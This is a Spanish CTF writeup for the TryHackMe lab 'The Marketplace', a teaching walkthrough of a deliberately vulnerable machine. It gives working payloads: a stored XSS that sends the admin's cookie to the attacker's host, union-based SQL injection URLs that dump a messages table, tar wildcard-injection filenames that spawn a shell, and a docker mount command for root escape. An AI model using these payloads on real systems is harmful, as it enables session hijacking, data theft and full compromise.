---
title: "The Marketplace - THM Writeup"
date: 2022-01-07T18:55:30-04:00
categories:
  - cajas
tags:
  - thm
  - xss
  - web
  - docker
---

En el campo de la ciberseguridad, el realizar las pruebas en competencias del tipo `Captura la bandera` o `CTF` nos ayuda a comprender los conceptos claves sobre aquellas vulnerabilidades que pudiesen estar presentes en un entorno empresarial.

[TryHackMe](https://www.tryhackme.com) es una de esas plataformas donde presentan maquinas en la nube virtualizadas con las cuales se puede practicar las auditorias de ciberseguridad en entornos controlados.

El dia de hoy se presenta una guia o `Writeup` en el cual se explica la metodologia de trabajo a seguir para lograr obtener las `Flags` necesarias para completar este reto.

Para ello empezaremos logeandonos en `TryHackMe` con nuestras credenciales, vamos al apartado de `Learn` y desde ahi usamos el buscador para encontrar nuestra maquina llamada `The Marketplace` con la siguiente descripcion:

The sysadmin of The Marketplace, ***Michael***, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out. Can you take advantage of this and will you be able to gain root access on his server?
{: .notice--info}

Aunque no parezca de gran importancia, al tener esta descripcion ya debemos de tomar en cuenta que es posible que exista el usuario `michael` en el sistema.

Una vez logeados, procedemos a iniciar la maquina ~~y agregarle 1 hora mas por si acaso~~, luego nos conectamos al VPN con
> `sudo openvpn /PATHTO/USER.ovpn`

y empezamos...

## RECONOCIMIENTO

Para empezar nuestro reconocimiento, ya sabemos que esta maquina es Linux pero podriamos averiguarlo al hacer `ping -c 1 IPMAQUINA` y ver si el TTL del paquete esta cercano a 64 (Linux) o a 128 (Windows), luego procederemos a hacer un escaneo completo de todos los puertos TCP utilizando NMap con ciertas opciones que nos ayudaran a identificar mejor los puertos que de verdad se quieren obtener, para ello utilizamos el siguiente comando
> `nmap -p- --open -T5 -n -v 10.10.134.243 -oN puertos.txt`

Donde se especifican los 65535 puertos TCP con `-p-`, se obtienen solo los puertos con estado `--open`, se utiliza la maxima velocidad de escaneo con `-T5`, se evita el uso de DNS con `-n`, se utiliza el verbose con `-v` para ver los puertos que se vayan encontrando, y finalmente se extrae la salida del escaneo a un archivo con `-oN puertos.txt`

Con esto nos encontramos con la siguiente salida:

![image](https://user-images.githubusercontent.com/85322110/148669325-87837453-932e-4d1a-b484-6e23cbfc7ef1.png)

Donde se pueden observar que tenemos los puertos TCP abiertos `22,80,32768`

Procedemos a seguir enumerando con mas detalle estos puertos que fueron encontrados abiertos, haciendo uso de otras opciones de NMap para usar scripts de enumeracion por defecto con `-sC` y detectando la version de los protocolos abiertos con `-sV`

> `nmap -sC -sV -p22,80,32768 10.10.134.243 -oN version.txt`

Nos topamos con la siguiente informacion:

![image](https://user-images.githubusercontent.com/85322110/148669184-c6ce64b2-f793-484a-85f1-282aabcb62e6.png)

Vemos que existen dos paginas http tanto en el puerto 80 como en el 32768, para ellas dos vamos a utilizar el paquete `whatweb` para obtener informacion extra de estas:

> `whatweb http://10.10.134.243 http://10.10.134.243:32768 | tee whatweb.txt`

Con `tee` hacemos que la salida del programa se muestre en consola y al mismo tiempo se cree un archivo con el mismo contenido, tenemos lo siguiente:

![image](https://user-images.githubusercontent.com/85322110/148669493-292bf805-00d3-40e7-abe1-8a673830b1de.png)

A este punto podemos abrir el navegador web y abrir la pagina del puerto 80 primero, y ahi utilizar la extension [Wappalyzer](https://www.wappalyzer.com/apps/) que nos dara mas o menos la misma informacion obtenida por `whatweb` como sigue:

![image](https://user-images.githubusercontent.com/85322110/148669563-7546a42f-1f93-429a-ad55-a0529e1b4126.png)

Ya con la informacion que tenemos, se puede empezar con la siguiente etapa...

## ESCANEO

Con la informacion obtenida anteriormente, tenemos tres puertos con los cuales podemos iniciar a probar vectores de ataque.

Para el puerto `22 SSH` no hay mucho que hacer pues no disponemos de credenciales y al probar credenciales por defecto no logramos acceso, pasamos a probar la pagina web del puerto `80 HTTP` a ver que encontramos.

Al entrar en la pagina nos topamos con un cierto estilo de catalogo de objetos, pero lo interesante es que vemos un panel de *Log in* y *Sign up*, es altamente recomendable antes de empezar a probar cualquier cosa, registrarse en la pagina (y esto aplica siempre que exista un apartado de registro) para revisar el funcionamiento y ver que se puede lograr siendo un usuario basico recien registrado.

Una vez logeados, hemos obtenido una Cookie de sesion llamada `token` que no existia antes, y con [EditThisCookie](https://www.editthiscookie.com/blog/2014/03/install-editthiscookie/) podemos ver y alterar su valor, con lo cual podemos tener en cuenta de que podriamos explotar un posible *Cookie Hijacking*

![image](https://user-images.githubusercontent.com/85322110/148669908-af5c890f-fd2f-4308-82cd-5c81677f1e41.png)

Por ahora no podemos hacer nada, asi que seguimos, y vemos que se pueden crear nuevos objetos en el catalogo que aparece al inicio donde tenemos un formulario para `Titulo`, `Descripcion` y un sospechoso apartado para subir archivos que esta desactivado segun por razones de seguridad:

![image](https://user-images.githubusercontent.com/85322110/148669762-adcdb5d1-ad87-499f-a0ca-049247bd6838.png)
 
Podriamos intentar saltarnos la desactivacion del boton usando el mismo codigo fuente de la pagina

![image](https://user-images.githubusercontent.com/85322110/148669793-942b2c7f-d0ab-4687-85a8-e3d1a31ee7bc.png)

Pero luego de diferentes pruebas, el boton parece no tener efecto a pesar de tener cargado un archivo, asi que suponemos el deshabilitado de subidas fue hecho tambien en el codigo lo cual dificultaria la evacion de esta restriccion.

Siguiendo adelante, crear el nuevo objeto, la misma pagina nos redirecciona a este:

![image](https://user-images.githubusercontent.com/85322110/148669869-5e18687e-67b9-4a7f-9ce4-d45931c10ae7.png)

Aca vemos que existen opciones adicionales para contactar al creador del objeto, y ademas una opcion que nos permite Reportar el objeto al equipo de administradores de la pagina, una vez reportado el objeto recibimos un mensaje de que un administrador revisara si existe una regla y nos devolvera un mensaje con el resultado.

![image](https://user-images.githubusercontent.com/85322110/148669986-561e2b2f-d1d5-464e-82c3-5f7b6326b6b0.png)

Pasado un corto tiempo, al revisar los mensajes nuevamente, vemos que un administrador efectivamente abrio el objeto listado y nos devolvio un mensaje diciendo que no hay nada que viole los reglamentos

![image](https://user-images.githubusercontent.com/85322110/148670008-741b677f-e228-42b2-98f9-689858eabca8.png)

Si el administrador abre efectivamente la publicacion del objeto, esto nos indica un posible vector de ataque de `Cross-Site Request Forgery (XSRF)` donde se aprovecha de que un usuario privilegiado acceda a un recurso "malicioso" otorgado por un usuario no-privilegiado con fines cuestionables.

Para ello probaremos si algunos de los formularios para crear un nuevo objeto son vulnerables a `Cross Site Scripting (XSS)` y podemos ejecutar codigo HTML o JS en el mismo.
Esto lo podemos hacer de muchisimas formas pero aca va una lista de las mas comunes a probar:

```html
<h1>Encabezado</h1>
<marquee>Texto moviendose</marquee>
<script>alert('Alerta emergente')</script>
```

![image](https://user-images.githubusercontent.com/85322110/148670203-c628d353-80c1-46c5-8fe5-954a8b483516.png)

Al probar el etiquetado `<script>` vemos que efectivamente el sitio es vulnerable a `XSS` y los scripts si pueden ser ejecutados y forjados:

![image](https://user-images.githubusercontent.com/85322110/148670222-6780c408-303f-4373-a386-fd4c50dd1932.png)

Ya que sabemos que podemos introducir scripts dentro de los objetos que creamos, y sabemos que podemos hacer reporte a los admins para que ellos abran forzadamente estos objetos, podemos pensar en maneras de robarles la **cookie de sesion** y asi tener un acceso privilegiado a traves del robo de ese `token`.

Para esto podriamos hacer uso del objeto `document` presente en [JavaScript](https://www.w3schools.com/js/js_htmldom_document.asp) y aprovecharnos de la propiedad `.cookie` de este mismo para poder leer las Cookies de la persona que ejecuta el script.

Si en vez de pasar texto a la funcion `alert()` pasamos la propiedad `document.cookie` del modo

```html
<script>alert(document.cookie)</script>
```

Y lo introducimos dentro del campo Descripcion del objeto, al abrir este objeto nos topamos con una alerta emergente con nuestra Cookie de sesion actual:

![image](https://user-images.githubusercontent.com/85322110/148670387-35d03214-b6a3-4901-9fa8-e1ce49e45533.png)

Ahora bien, nuestro interes es de cierta forma remotamente obtener la Cookie del administrador, pero mostrarlo en una alerta emergente para el no nos servira de mucho, asi que debemos pensar una forma de obtener esa informacion en nuestro extremo y lograr nuestro `Cookie Hijacking` a ver que privilegios logramos.

Una de estas formas es hacer un script que intente hacer una peticion `GET` a un servidor web nuestro y agregar de alguna forma la Cookie actual en algun campo de esta peticion `GET`. Esto se logra facilmente si nos montamos un servidor web local con `Python` a traves de un modulo que trae por defecto llamado `http.server`, lo montamos de la siguiente forma:

> sudo python -m http.server 80

![image](https://user-images.githubusercontent.com/85322110/148670510-17926c3c-f02a-471d-867f-b2f7a3e88e4a.png)

Ya con esto tenemos un servidor activo en el puerto 80 de nuestra IP, el cual nos mostrara las peticiones en pantalla. De esta forma si creamos un nuevo objeto en el Marketplace y utilizamos el siguiente tag en el campo de Descripcion

```html
<img src="http://10.8.33.130/image.jpg"></img>
```

Vemos que esta tag intentara poner una imagen proveniente de nuestra IP 10.8.33.130 (asignada en la interfaz `tun0` proporcionada por el `openvpn`) pero dicha imagen no existe, sin embargo en la consola logramos ver la peticion de igual manera:

![image](https://user-images.githubusercontent.com/85322110/148670569-f40a419e-a2a2-4fc4-ae8b-c384e75accb5.png)

Ahora hay que buscar una forma de agregar la Cookie a esta peticion, para ello podriamos hacer uso de otra propiedad del objeto `document` llamada `.write` la cual escribe dentro de la salida del HTML en si, y con el siguiente script podemos precisamente agregar la cookie al final de la peticion que hicimos en la imagen:

```html
<script>document.write('<img src="http://10.8.33.130/image.jpg?' + document.cookie + '"></img>')</script>
```

Analizando el script, vemos que es la misma peticion `<img src="http://10.8.33.130/image.jpg"></img>` pero se le agrego `?token=xxxxxxxxxxxxxx` a traves de concatenacion lograda por el metodo `document.write` presente en JavaScript.

Si creamos nuevamente un objeto dentro del Marketplace con el script fabricado arriba, veremos la respuesta en consola al hacer la peticion por la `img`

![image](https://user-images.githubusercontent.com/85322110/148670692-816dad45-3ac7-43a0-8476-f4b1ae841cf0.png)

A pesar de seguir respondiendo con un codigo 404 imagen no existente, igual podemos ver la Cookie de sesion (en este caso de nuestra propia cuenta que creamos).
Ahora bien, este objeto creado en Marketplace enviara la peticion junto con la Cookie a nuestro servidor de cualquier persona que abra este item, y sabemos que los admins abren estos objetos al ser reportados, sabiendo esto pasaremos a reportar este mismo objeto a ver si un admin lo abre y podemos robar su *Cookie de sesion*.

![image](https://user-images.githubusercontent.com/85322110/148670735-6a419888-d796-43ca-bbc7-1e1a16b7255f.png)
![image](https://user-images.githubusercontent.com/85322110/148670742-d8cfec36-3254-4c41-b068-c68259a39847.png)

El servidor web fue re-lanzado para tener una consola limpia, y vemos que efectivamente hemos recibido una `Cookie de sesion` al enviar el reporte (esperando que sea la de admin), si luego con nuestro [EditThisCookie](https://www.editthiscookie.com/blog/2014/03/install-editthiscookie/) cambiamos nuestra Cookie actual a esta que hemos recibido:

![image](https://user-images.githubusercontent.com/85322110/148670778-8fe91f1c-d2ef-467e-abda-a9f0a1572ba4.png)

Al presionar F5 o recargar la pagina, notamos que aparece un nuevo boton llamado `Administration panel` presente en las opciones de la pagina, cosa que no salia anteriormente.

![image](https://user-images.githubusercontent.com/85322110/148670794-492484f0-4593-475a-992d-69670a537f5b.png)

Y al entrar nos encontramos con nuesta primera flag y una lista de usuarios registrados en el sitio:

![image](https://user-images.githubusercontent.com/85322110/148670834-6aac0989-9b5a-46b4-abd8-ee8063a07627.png)

Comprobamos que efectivamente existe un usuario para `michael`. Al hacer click en cualquiera de estos usuarios nos lleva a otra pagina donde nos muestra ciertos atributos de ese usuario, sin embargo de la forma en que la muestra, pareciera estar obteniendo valores de una Base de Datos por como obtenemos los mismos atributos al solo cambiar el ID del usuario en la URL:

![image](https://user-images.githubusercontent.com/85322110/148671010-ed013413-319d-4422-8980-e75dbe159eb6.png)

Con ello, probando insertar una sola comilla en el campo `?user=1` de la URL, vemos que efectivamente estamos ante un MySQL y la entrada del usuario no esta sanitizada para prevenir `SQL Injection`

![image](https://user-images.githubusercontent.com/85322110/148671046-af82c749-ec12-48c7-b79b-88fa1552f7b5.png)

Por lo tanto, procedemos a hacer pasos para enumerar las bases de datos existentes a traves de `SQL Injection`:

- Encontrar cantidad de columnas mostradas:

Lo primero que debemos hacer es encontrar la cantidad de columnas que se muestran en la pagina, mas adelante se explica el por que debemos hacer este paso.
Existen varias formas de lograr esto, pero la mas comun es usando la instruccion `ORDER BY #` (añadiendo `;-- -` para finalizar la instruccion con `;` y comentar el resto de la linea `-- -` que existiese dentro del codigo fuente) de MySQL, a esta instruccion le presigue un numero que debemos probar hasta que nos arroje error, al momento de arrojar error significa que el numero usado es efectivamente mayor que la cantidad de columnas existentes en la tabla actual, por lo cual nos quedamos con el numero anterior, ejemplo:

> `http://10.10.134.243/admin?user=1 ORDER BY 5;-- -`

Al usar el numero 5 nos arroja un error con el cual podemos presumir que el numero real de columnas es 4 y no 5, ya que ni con 4 ni 3 ni 2 ni 1 da error.

![image](https://user-images.githubusercontent.com/85322110/148671336-57569e22-b7b5-47ce-afff-3e6bf30f4aa5.png)

Otra opcion sera la de usar directamente los numeros separados por comas para asi tener una respuesta mas rapida, a cuesta del tiempo que tardamos en introducir la cantidad de numeros a probar como:

> `http://10.10.134.243/admin?user=1 ORDER BY 1,2,3,4,5,6,7,8,9,10;-- -`

Con esto recibiremos exactamente el mismo error anterior, indicando falla en encontrar la columna 5, es decir que existen solo 4 de ellas.

- Implantar campos de prueba en tablas mostradas:

Lo que viene es hacer uso de la instruccion `UNION` para unir la tabla existente y una falsa tabla que nos crearemos con el fin de poder ver en al menos un campo, el resultado de las peticiones que haremos mas adelante.

Para esto debemos añadir `UNION SELECT 1,2,3,4;-- -` al final de la peticion, recordando que ahora sabemos que son 4 la cantidad de columnas existentes. Si se intenta esto a pesar de no obtener error, nuestro interes final es que aparezca los numeros introducidos (1, 2, 3 o 4) en algun campo de la pagina, sin embargo esto no pasa y es porque la cantidad de elementos a mostrar esta delimitada, para evitar esto cambiamos el valor que realmente es comparado en la base de datos (`user=1`) por algun otro que no exista, puede ser cualquiera mayor a 3 (ya que 3 es el ID de nuestro usuario creado, el usuario con ID 4 no existe, ni ningun otro numero mayor), pero lo mas comun usado en `SQL Injection` es cambiarlo y poner `-1` en cambio (`user=-1`) y asi dejar los cambios limpios para que nuestra otra tabla pase a tomar estas posiciones en la pagina:

> `http://10.10.134.243/admin?user=-1 UNION SELECT 1,2,3,4;-- -`

![image](https://user-images.githubusercontent.com/85322110/148671621-da856103-20e6-44bd-9c51-476ef78e0afa.png)

En la imagen los valores luego del SELECT fueron cambiados a `...admin?user=-1 UNION SELECT 'a','b','c','d';-- -` para mostrar de mejor manera en que posiciones se introducen estos nuevos valores, con eso en mente, procederemos a inyectar valores dentro del cambio `'b'` o `2` para efectos practicos.

- Obtener nombres de bases de datos:

Para leer especificamente los nombres de Bases de Datos en MySQL, existe una tabla en donde estos son almacenados en una base de datos interna por defecto llamada `information_schema` el cual tiene mucha informacion de interes para un atacante (mas [aqui](https://mariadb.com/kb/en/information-schema-tables/)), especificamente buscamos el valor `schema_name` dentro de la tabla `schemata` de la base de datos `information_schema`, asi que procedemos a crear la siguiente consulta haciendo uso de la funcion `group_concat()` el cual nos lista multiples valores en uno solo separados por coma:

> `http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata;-- -`

![image](https://user-images.githubusercontent.com/85322110/148672214-47fc90cb-2487-4958-a3f0-0ac6ceb86470.png)

Vemos que existen solo dos bases de datos, `information_schema` que siempre esta presente, y `marketplace` que es de nuestro interes

- Obtener nombres de tablas:

Para seguir indagando hacia abajo, podemos leer los nombres de las tablas dentro de las bases de datos haciendo uso de la tabla `table_name` dentro de `information_schema` sabiendo que el `table_schema` es `marketplace`, por lo tanto preparamos la siguiente consulta:

> `http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='marketplace';-- -`

![image](https://user-images.githubusercontent.com/85322110/148672577-184335f3-8737-469c-9e0f-394a21ffb65e.png)

Esto nos devuelve tres tablas con `items`, `messages`, y `users`

- Obtener nombres de atributos:

En este caso nos enfocaremos en la tabla `messages` ya que al parecer es la unica que tiene informacion de interes. A continuacion buscaremos obtener los valores de `column_name` dentro de `information_schema` sabiendo que el `table_name` es `messages`, queda la siguiente consulta:

> `http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='messages';-- -`

![image](https://user-images.githubusercontent.com/85322110/148672717-f95ef712-8c0d-44c7-a999-c63f55e17e55.png)

Esto nos devuelve los valores de `id`, `is_read`, `message_content`, `user_from`, `user_to`. Con esta informacion ya concluimos que nuestros valores de interes son `message_content`, `user_from`, `user_to` para los cuales intentaremos recuperar todos sus valores desde la tabla `messages` con la siguiente consulta:

> `http://10.10.134.243/admin?user=-1 UNION SELECT 1,group_concat(user_from,0x3a,user_to,0x3a,message_content),3,4 FROM messages;-- -`

![image](https://user-images.githubusercontent.com/85322110/148672903-7d729616-0161-4130-9657-801163ff7f46.png)

Como vemos arriba, no hace falta especificar la base de datos ya que se asume estamos trabajando dentro de ella, de igual forma es valido poner el formato full con `marketplace.messages`, tambien hemos utilizado `0x3a` dentro de la instruccion `group_concat()` que representa el simbolo de dos puntos `:` en hexadecimal, para separar los diferentes valores que nos encontramos.

Con la informacion obtenida, vamos de vuelta a nuestra consola y utilizamos el paquete `tr ',' '\n'` para reemplazar las comas que se usan para separar los atributos en saltos de linea y sean mas facil de leer:

![image](https://user-images.githubusercontent.com/85322110/148673128-148e3ebf-0ac9-4e66-9511-f1b70102b27f.png)

Vemos que el usuario 1 (admin) le envio al usuario 3 (jake) una clave temporal de SSH que es `@b_ENXkGYUCAv3zJ`, la guardamos por si acaso

![image](https://user-images.githubusercontent.com/85322110/148673163-c77155f8-3094-4789-80c0-17b7195b580b.png)

Y al probar logearnos en SSH con esa clave, funciona perfecta

> `ssh jake@10.10.134.243`

![image](https://user-images.githubusercontent.com/85322110/148673205-c9c6e411-1ab2-4c0c-86d5-4fade03aab73.png)

La IP de la maquina cambio pero el procedimiento sigue siendo el mismo, ya con esto se logra el acceso al server y tenemos nuestra `Flag` de `user.txt` que se encuentra dentro de `/home/jake/user.txt`

![image](https://user-images.githubusercontent.com/85322110/148673256-1d167847-2b21-483c-bdd0-457293a0e1ca.png)

## ESCALADA DE PRIVILEGIOS

Una vez dentro y logeados como `jake` aun no tenemos permisos de root por lo tanto nos falta aun la bandera `root.txt` que deberia estar dentro de `/root/`. Pasamos a revisar y nos damos cuenta que al ver los privilegios sudoers con `sudo -l` tenemos permisos como `michael` de ejecutar el script en bash `/opt/backups/backup.sh`, el cual haciendo un `cat` podemos ver su funcionamiento:

![image](https://user-images.githubusercontent.com/85322110/148673373-201bafb0-3be4-475a-a1c8-9def89e50327.png)

Vemos que el script usa el comando `tar` para comprimir todos los archivos del sistema usando el *wildcard* `*`, este *wildcard* supone un riesgo de seguridad, debido a que si lee todos los archivos, si un archivo tiene de nombre una opcion de comando (ejemplo: un archivo llamado `--help`), el programa en vez de leerlo como archivo, lo ejecuta como opcion adicional de sus propios argumentos. Esto se conoce como `Wildcard Injection`.

Segun [GTFOBins - tar](https://gtfobins.github.io/gtfobins/tar/) podemos explotar esta vulnerabilidad si añadimos `--checkpoint=1 --checkpoint-action=exec=bash` como argumentos de un comando `tar`, en este caso debemos crear dos archivos llamados `--checkpoint=1`  y `--checkpoint-action=exec=bash` en un directorio donde tengamos permisos

![image](https://user-images.githubusercontent.com/85322110/148673567-bc92e24f-7ea8-415a-9b6e-6d3f5fe8cf34.png)

Como vemos existen varias formas de crear archivos que empiecen con guiones. Una vez creados estos archivos, pasamos a ejecutar el script en bash a ver si obtenemos una consola con privilegios de `michael`:

![image](https://user-images.githubusercontent.com/85322110/148673633-a90036c2-5129-474f-9797-d31a142c3207.png)

Efectivamente al ejecutar el comando haciendo uso de la opcion `-u michael` para que el `sudo` lo haga como `michael` y no como `root` (que igual no tenemos permisos) obtenemos una consola con el usuario de `michael`, y justamente al ver su `id` vemos que pertenece al grupo de `docker`.

Aca nuevamente segun [GTFOBins - docker](https://gtfobins.github.io/gtfobins/docker/) podemos aprovecharnos de estar adentro del grupo de `docker` para crear un contenedor y poder montar dentro de el los archivos que no podriamos leer aun debido a falta de permisos, para ello primero vemos que imagenes existen instaladas para los contenedores con:

> `docker images`
![image](https://user-images.githubusercontent.com/85322110/148673778-4a21b1de-a20d-48bc-9ee0-25057debc687.png)

Y vemos que existe la imagen `alpine` que es un entorno muy ligero y nos puede servir perfectamente para lo que se necesita. Ultimadamente vamos a montar un `docker` con las siguientes opciones:

> `docker run -v /:/mnt --rm -it alpine chroot sh`

Que con uso de la funcion `run` montara el `docker alpine` de modo interactivo `-it`, creando el volumen `-v` metiendo todo lo que esta en `/` dentro `:` de `/mnt`, removera el docker una vez salgamos con `--rm` y finalmente ejecutara el comando `sh` el cual nos da una shell.

![image](https://user-images.githubusercontent.com/85322110/148673901-b30a24a3-e5c1-46ef-af32-500ca85c2f47.png)

Con esto hemos entrado dentro del `docker alpine` y tenemos permisos de usuario root dentro de este entorno, sin embargo notamos que no estan los archivos de la maquina, y en /root/ no hay nada, esto pasa porque hemos de recordar que el sistema de archivos de `/` lo hemos montado dentro de `/mnt/`

![image](https://user-images.githubusercontent.com/85322110/148673996-ee84585d-de18-4133-8fc6-a0e4f504dcff.png)

Con esto finalmente logramos la bandera de `root.txt` y hemos efectivamente completado esta maquina a traves de `XSS`, `XSRF`, `SQL Injection` y `Wildcard Injection`.

Se espera que los conceptos presentes en esta maquinas hayan sido explicados correctamente y se puedan entender los procedimientos para explotar las vulnerabilidades presentes en `The Marketplace`, muchisimas gracias por tomarse el tiempo de leer este `Writeup` y se le invita a estar pendiente para nuevas guias.

Saludos!
